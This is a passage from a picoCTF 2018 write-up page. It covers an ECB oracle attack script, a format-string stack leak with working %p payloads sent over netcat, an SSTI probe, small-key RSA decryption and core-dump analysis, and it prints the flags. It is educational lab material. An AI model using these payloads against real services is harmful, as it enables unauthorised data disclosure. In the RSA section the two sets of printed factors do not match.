</span>    <span class="n">wrap_start</span> <span class="o">=</span> <span class="sh">'</span><span class="s">z</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">11</span> <span class="o">+</span> <span class="sh">'</span><span class="s">a</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">16</span>

    <span class="n">wrap_end</span> <span class="o">=</span> <span class="sh">'</span><span class="s">a</span><span class="sh">'</span> <span class="o">*</span> <span class="p">(</span><span class="mi">16</span> <span class="o">+</span> <span class="mi">11</span><span class="p">)</span>  <span class="o">+</span><span class="sh">'</span><span class="se">\n</span><span class="sh">'</span>

    <span class="c1"># picoCTF{@g3nt6_1$_th3_c00l3$t_3355197}
</span>    <span class="n">inputs</span> <span class="o">=</span> <span class="p">[</span>
        <span class="sh">'</span><span class="s">c00l3$t_3355197</span><span class="sh">'</span> <span class="o">+</span> <span class="n">y</span>
        <span class="k">for</span> <span class="n">y</span> <span class="ow">in</span> <span class="p">[</span><span class="sh">'</span><span class="s">_</span><span class="sh">'</span><span class="p">]</span> <span class="o">+</span> <span class="nf">list</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">printable</span><span class="p">[</span><span class="n">z</span><span class="p">:</span><span class="nf">min</span><span class="p">(</span><span class="n">z</span> <span class="o">+</span> <span class="mi">20</span><span class="p">,</span> <span class="mi">95</span><span class="p">)])</span>
    <span class="p">]</span>


    <span class="n">nc</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">wrap_start</span> <span class="o">+</span> <span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">inputs</span><span class="p">)</span> <span class="o">+</span> <span class="n">wrap_end</span><span class="p">)</span>

    <span class="n">resp</span> <span class="o">=</span> <span class="n">nc</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span> <span class="c1"># output
</span>

    <span class="k">def</span> <span class="nf">splitn</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="n">n</span><span class="o">=</span><span class="mi">32</span><span class="p">):</span>
        <span class="k">return</span> <span class="p">[</span><span class="n">line</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="n">n</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nf">len</span><span class="p">(</span><span class="n">line</span><span class="p">),</span> <span class="n">n</span><span class="p">)]</span>


    <span class="c1"># split on the 'a' * 16
</span>    <span class="c1"># print('\n'.join(splitn(resp)))
</span>
    <span class="n">prefix</span><span class="p">,</span> <span class="n">queries</span><span class="p">,</span> <span class="n">postfix</span> <span class="o">=</span> <span class="n">resp</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s">99908ad37adef3fb5a94680c5a64c6ca</span><span class="sh">'</span><span class="p">)</span>

    <span class="n">pm</span> <span class="o">=</span> <span class="nf">list</span><span class="p">(</span><span class="nf">splitn</span><span class="p">(</span><span class="n">postfix</span><span class="p">))</span>

    <span class="c1"># ignore prefix
</span>
    <span class="nf">for </span><span class="p">(</span><span class="n">q</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span> <span class="ow">in</span> <span class="nf">zip</span><span class="p">(</span><span class="nf">splitn</span><span class="p">(</span><span class="n">queries</span><span class="p">),</span> <span class="n">inputs</span><span class="p">):</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">q</span> <span class="ow">in</span> <span class="n">pm</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">q</span> <span class="ow">in</span> <span class="n">pm</span><span class="p">:</span>
            <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">()</span>

    <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</pre></table></code></div></div><p>This would pass 20 ‘query’ strings at a time (part of the string + 1 new</p><p>letter), since the script seemed to limit the volume of input it would actually<br /> attempt. This actualy worked surprisingly well. We started with the input string<br /> <code class="language-plaintext highlighter-rouge">ode is: picoCTF</code> and have it find the <code class="language-plaintext highlighter-rouge">{</code>, and then just remove the left most<br /> character, decrease the counter for the postfix padding of <code class="language-plaintext highlighter-rouge">a</code>s, and add the<br /> new letter to the end of the known input string.</p><h2> Flag</h2><code> picoCTF{@g3nt6_1$_th3_c00l3$t_3355197} </code><hr><h1 id="binary-exploitation-300-echooo"> Binary Exploitation 300: echooo <a href="/CTF-writeups-public/writeups/PicoCTF_2018/63-binary-exploitation-300-echooo.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>This program prints any input you give it. Can you <a href="writeupfiles/leak">leak</a> the flag? Connect with <code class="language-plaintext highlighter-rouge">nc 2018shell1.picoctf.com 23397</code>.</p><p><a href="writeupfiles/echo.c">Source</a></p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>

  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
  <span class="kt">char</span> <span class="n">flag</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">flag_ptr</span> <span class="o">=</span> <span class="n">flag</span><span class="p">;</span>

  <span class="c1">// Set the gid to the effective gid</span>
  <span class="n">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
  <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>

  <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">flag</span><span class="p">));</span>
  <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>

  <span class="n">puts</span><span class="p">(</span><span class="s">"Time to learn about Format Strings!"</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"We will evaluate any format string you give us with printf()."</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"See if you can get the flag!"</span><span class="p">);</span>

  <span class="kt">FILE</span> <span class="o">*</span><span class="n">file</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"flag.txt"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">file</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="n">fgets</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">flag</span><span class="p">),</span> <span class="n">file</span><span class="p">);</span>

  <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">);</span>
    <span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="n">stdin</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>printf function is vulnerable to format string attacks. We can pass it a string lik <code class="language-plaintext highlighter-rouge">%x</code> or <code class="language-plaintext highlighter-rouge">%p</code> and read the stack.</p><p>since we know that <code class="language-plaintext highlighter-rouge">picoCTF</code> is <code class="language-plaintext highlighter-rouge">7069636f435446</code> in hex, we should be able to spot the flag on the stack, let’s try it:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>$ python -c "print('%p'*32)" | nc 2018shell1.picoctf.com 23397
Time to learn about Format Strings!
We will evaluate any format string you give us with printf().
See if you can get the flag!
&gt; 0x400xf779a5a00x80486470xf77d1a740x10xf77a94900xffc1c8a40xffc1c7ac0x4910x89990080x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x2570250x6f6369700x7b4654430x6d526f660x735f74340x6e695274
</pre></table></code></div></div><p>reformatted to make easier to read:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre><td class="rouge-code"><pre>0x40
0xf77515a0
0x8048647
0xf7788a74
0x1
xf7760490
0xfff4a3c4
0xfff4a2cc
0x491
0x81aa008
0x70257025   # our own input of %p repeatedly
0x70257025
0x70257025
0x70257025
0x70257025
0x70257025
0x70257025
0x70257025
0x70257025
0x70257025
0x70257025
0x70257025
0x70257025
0x70257025
0x70257025
0xa
0x6f636970  # flag? (little endian)
0x7b465443
0x6d526f66
0x735f7434
0x6e695274
..
</pre></table></code></div></div><p>The bytes around the flag translate to:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>ocip
{FTC
mRof
s_t4
niRt
</pre></table></code></div></div><p>accounting for little endian this gives us:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>picoCTF{foRm4t_stRin
</pre></table></code></div></div><p>but end is missing? our buffer isnt big enough to show us the whole flag, so we gotta be smarter about it.</p><p>Passing a format string like <code class="language-plaintext highlighter-rouge">%42$p</code> will return the 42nd item on the stack</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>$ python -c "print(''.join(['%'+str(i)+'\$p' for i in range(27,39)]))" | nc 2018shell1.picoctf.com 23397                    [13-10-18 11:25:04]
Time to learn about Format Strings!
We will evaluate any format string you give us with printf().
See if you can get the flag!
&gt; 0x6f6369700x7b4654430x6d526f660x735f74340x6e6952740x615f73470x445f65520x65476e610x737530720x3435325f0x613834310xa7d65
</pre></table></code></div></div><p>or with a bit of extra formatting:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>$ python -c "print(''.join(['%'+str(i)+'\$p' for i in range(27,39)]))" | nc 2018shell1.picoctf.com 23397 |head -n 4 | tail -n 1 | sed 's/0x/\n0x/g' | python ../../_resources/code/l2a.py
&gt;
0x6f636970 ocip
0x7b465443 {FTC
0x6d526f66 mRof
0x735f7434 s_t4
0x6e695274 niRt
0x615f7347 a_sG
0x445f6552 D_eR
0x65476e61 eGna
0x73753072 su0r
0x3435325f 452_
0x61383431 a841
0xa7d65
</pre></table></code></div></div><p>the last line tranlslates to <code class="language-plaintext highlighter-rouge">e}</code> so full flag is:</p><h2> Flag</h2><code> picoCTF{foRm4t_stRinGs_aRe_DanGer0us_254148ae} </code><hr><h1 id="general-skills-300-learn-gdb"> General Skills 300: learn gdb <a href="/CTF-writeups-public/writeups/PicoCTF_2018/64-general-skills-300-learn-gdb.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Using a debugging tool will be extremely useful on your missions. Can you run <a href="writeupfiles/run2">this program</a> in gdb and find the flag?</p><p>You can find the file in <code class="language-plaintext highlighter-rouge">/problems/learn-gdb_2_32e08c18932eb88649e9b97f3020b9f5</code> on the shell server.</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Executing the programme looks like:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>$ ./run
Decrypting the Flag into global variable 'flag_buf'
.....................................
Finished Reading Flag into global variable 'flag_buf'. Exiting.
</pre></table></code></div></div><p>One of the hints read:</p><blockquote><p>Try and find a point in the program after the flag has been read into memory to break on</p></blockquote><p>So we disassembled main:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre>(gdb) disas main
Dump of assembler code for function main:
   0x00000000004008c9 &lt;+0&gt;:     push   %rbp
   0x00000000004008ca &lt;+1&gt;:     mov    %rsp,%rbp
   0x00000000004008cd &lt;+4&gt;:     sub    $0x10,%rsp
   0x00000000004008d1 &lt;+8&gt;:     mov    %edi,-0x4(%rbp)
   0x00000000004008d4 &lt;+11&gt;:    mov    %rsi,-0x10(%rbp)
   0x00000000004008d8 &lt;+15&gt;:    mov    0x200af9(%rip),%rax        # 0x6013d8 &lt;stdout@@GLIBC_2.2.5&gt;
   0x00000000004008df &lt;+22&gt;:    mov    $0x0,%ecx
   0x00000000004008e4 &lt;+27&gt;:    mov    $0x2,%edx
   0x00000000004008e9 &lt;+32&gt;:    mov    $0x0,%esi
   0x00000000004008ee &lt;+37&gt;:    mov    %rax,%rdi
   0x00000000004008f1 &lt;+40&gt;:    callq  0x400650 &lt;setvbuf@plt&gt;
   0x00000000004008f6 &lt;+45&gt;:    mov    $0x4009d0,%edi
   0x00000000004008fb &lt;+50&gt;:    callq  0x400600 &lt;puts@plt&gt;
   0x0000000000400900 &lt;+55&gt;:    mov    $0x0,%eax
   0x0000000000400905 &lt;+60&gt;:    callq  0x400786 &lt;decrypt_flag&gt;
   0x000000000040090a &lt;+65&gt;:    mov    $0x400a08,%edi
   0x000000000040090f &lt;+70&gt;:    callq  0x400600 &lt;puts@plt&gt;
   0x0000000000400914 &lt;+75&gt;:    mov    $0x0,%eax
   0x0000000000400919 &lt;+80&gt;:    leaveq
   0x000000000040091a &lt;+81&gt;:    retq
End of assembler dump.
</pre></table></code></div></div><p>And <code class="language-plaintext highlighter-rouge">break *0x000000000040090a</code>. Stepping once before calling</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>(gdb) x/1s flag_buf
0x2439010:      "picoCTF{gDb_iS_sUp3r_u53fuL_66d5464d}"
</pre></table></code></div></div><p>to see our flag! Magic!</p><h2> Flag</h2><code> picoCTF{gDb_iS_sUp3r_u53fuL_66d5464d} </code><hr><h1 id="web-exploitation-350-flaskcards"> Web Exploitation 350: Flaskcards <a href="/CTF-writeups-public/writeups/PicoCTF_2018/65-web-exploitation-350-flaskcards.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We found <a href="http://2018shell1.picoctf.com:51878/">this fishy website</a> for flashcards that we think may be sending secrets. Could you take a look?</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The site lets us create flashcards with answers.</p><p>After some googling, we find out this might be vulnerable to SSTI (server side template injection) attacks. We verify this by entering <code class="language-plaintext highlighter-rouge">{{7*'7'}}</code> as a card’s question or answer field, and indeed it outputs <code class="language-plaintext highlighter-rouge">7777777</code></p><p>Next we try to do something more interesting, we enter ``:</p><p><img src="writeupfiles/flaskcards_ss2.png" alt="" /></p><p>which gets us the flag:</p><p><img src="writeupfiles/flaskcards_ss.png" alt="" /></p><h2> Flag</h2><code> picoCTF{secret_keys_to_the_kingdom_e8a55760} </code><hr><h1 id="cryptography-350-super-safe-rsa"> Cryptography 350: Super Safe RSA <a href="/CTF-writeups-public/writeups/PicoCTF_2018/66-cryptography-350-super-safe-rsa.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Dr. Xernon made the mistake of rolling his own crypto.. Can you find the bug and decrypt the message?</p><p>Connect with <code class="language-plaintext highlighter-rouge">nc 2018shell1.picoctf.com 24039</code>.</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>we connect and get a set of RSA variables (always c,N,e but different every time)</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>c = 4610219302492866962570875523337872829970889535476946261497385462185929486416175
N = 28715218932555751976417148777726594094995296548335428875818442252725314913842461
e = 65537
</pre></table></code></div></div><p>We don’t find hits in <a href="factordb.com">factordb</a>, but this N is small enough to be factorized, but and indeed<br /> <a href="https://www.alpertron.com.ar/ECM.HTM">alpertron.com</a> does the factorization for us in about 12 minutes.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>p = 4608502214130535431876746639351117393190
q = 2734396875895981659754211798351705092981
</pre></table></code></div></div><p>so we get the plaintext:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">gmpy2</span>

<span class="n">N</span> <span class="o">=</span> <span class="mi">28715218932555751976417148777726594094995296548335428875818442252725314913842461</span>
<span class="n">c</span> <span class="o">=</span> <span class="mi">4610219302492866962570875523337872829970889535476946261497385462185929486416175</span>
<span class="n">e</span> <span class="o">=</span> <span class="mi">65537</span>
<span class="n">p</span> <span class="o">=</span> <span class="mi">165282687785851090832160512809009789897</span>
<span class="n">q</span> <span class="o">=</span> <span class="mi">173733978538397765928176741806245283295413</span>

<span class="n">r</span> <span class="o">=</span> <span class="p">(</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">q</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>

<span class="n">d</span> <span class="o">=</span> <span class="n">gmpy2</span><span class="p">.</span><span class="nf">divm</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">e</span><span class="p">,</span><span class="n">r</span><span class="p">)</span>
<span class="n">m</span> <span class="o">=</span> <span class="n">gmpy2</span><span class="p">.</span><span class="nf">powmod</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">N</span><span class="p">)</span>

<span class="nf">print</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="n">m</span><span class="p">)[</span><span class="mi">2</span><span class="p">:].</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">hex</span><span class="sh">'</span><span class="p">))</span>
</pre></table></code></div></div><h2> Flag</h2><code> picoCTF{us3_l@rg3r_pr1m3$_1850} </code><hr><h1 id="binary-exploitation-250-authenticate"> Binary Exploitation 250: authenticate <a href="/CTF-writeups-public/writeups/PicoCTF_2018/67-binary-exploitation-250-authenticate.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Challenge</strong><br /> Can you <a href="./writeupfiles/authenticate">authenticate</a> to this service and get the flag? Connect with nc 2018shell1.picoctf.com 43438. <a href="./writeupfiles/authenticate.c">Source.</a></p><h2 id="hints"><span class="mr-2">Hints</span><a href="#hints" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li>What happens if you say something OTHER than yes or no?</ul><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h2> Flag</h2><code> unsolved </code><hr><h1 id="forensics-350-core"> Forensics 350: core <a href="/CTF-writeups-public/writeups/PicoCTF_2018/68-forensics-350-core.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>This <a href="./writeupfiles/print_flag">program</a> was about to print the flag when it died. Maybe the flag is still in this <a href="./writeupfiles/core">core file</a> that it dumped?</p><p>Also available at /problems/core_0_28700fe29cea151d6a3350f244f342b2 on the shell server.</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre>(master) [hxr@mk:~/Personal/projects/ctf-writeups-galaxians/PicoCTF_2018/writeupfiles]148$ gdb print_flag core
warning: exec file is newer than core file.
[New LWP 59693]
Core was generated by `/opt/hacksports/staging/core_0_4983223896836212/problem_files/print_flag'.
Program terminated with signal SIGTRAP, Trace/breakpoint trap.
#0  print_flag () at ./print_flag.c:90
90      ./print_flag.c: Datei oder Verzeichnis nicht gefunden.
(gdb) disas
Dump of assembler code for function print_flag:
=&gt; 0x080487c1 &lt;+0&gt;:     push   ebp
   0x080487c2 &lt;+1&gt;:     mov    ebp,esp
   0x080487c4 &lt;+3&gt;:     sub    esp,0x18
   0x080487c7 &lt;+6&gt;:     mov    DWORD PTR [ebp-0xc],0x539
   0x080487ce &lt;+13&gt;:    mov    eax,DWORD PTR [ebp-0xc]
   0x080487d1 &lt;+16&gt;:    mov    eax,DWORD PTR [eax*4+0x804a080]
   0x080487d8 &lt;+23&gt;:    sub    esp,0x8
   0x080487db &lt;+26&gt;:    push   eax                               ; arg2: *eax
   0x080487dc &lt;+27&gt;:    push   0x804894c                         ; arg1: (x/s 0x804894c)
   0x080487e1 &lt;+32&gt;:    call   0x8048410 &lt;printf@plt&gt;            ; printf
   0x080487e6 &lt;+37&gt;:    add    esp,0x10
   0x080487e9 &lt;+40&gt;:    nop
   0x080487ea &lt;+41&gt;:    leave
   0x080487eb &lt;+42&gt;:    ret
End of assembler dump.
(gdb) x/s 0x804894c
0x804894c:      "your flag is: picoCTF{\%s}\n"
(gdb) x/s *(0x539*4 + 0x804a080)
0x80610f0:      "abb6a3b2603654804ed357322c760510"
</pre></table></code></div></div><p>We work backwards here, it will call printf with two arguments (the two</p><p><code class="language-plaintext highlighter-rouge">push</code>es before the <code class="language-plaintext highlighter-rouge">call</code>). Printing out the second <code class="language-plaintext highlighter-rouge">push</code> we see the format string. The first push just pushes eax, so whatever is in <code class="language-plaintext highlighter-rouge">eax</code> is being passed to the format string.</p><p>We cannot print out <code class="language-plaintext highlighter-rouge">eax</code> because it isn’t set yet (and trying to step/continue causes an immediate crash,) so we need to calculate what value will be in eax.</p><p>The relevant lines are:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>mov    DWORD PTR [ebp-0xc],0x539
mov    eax,DWORD PTR [ebp-0xc]
mov    eax,DWORD PTR [eax*4+0x804a080]
</pre></table></code></div></div><p>Which can be translated as</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>var1 = 0x539
eax = var1
eax = eax * 4 + 0x804a080
</pre></table></code></div></div><p>So whatever value is in the address <code class="language-plaintext highlighter-rouge">0x539 * 4 + 0x804a080</code> will be the string that’s printed out. We can do this with <code class="language-plaintext highlighter-rouge">x/s *(0x539 * 4 + 0x804a080)</code></p><h2> Flag</h2><code> picoCTF{abb6a3b2603654804ed357322c760510} </code><hr><h1 id="binary-exploitation-350-got-shell"> Binary Exploitation 350: got-shell? <a href="/CTF-writeups-public/writeups/PicoCTF_2018/69-binary-exploitation-350-got-shell.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Can you authenticate to <a href="writeupfiles/auth2">this service</a> and get the flag?</p><p>Connect to it with <code class="language-plaintext highlighter-rouge">nc 2018shell1.picoctf.com 54664</code>.</p><p><a href="writeupfiles/auth2.c">Source</a></p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
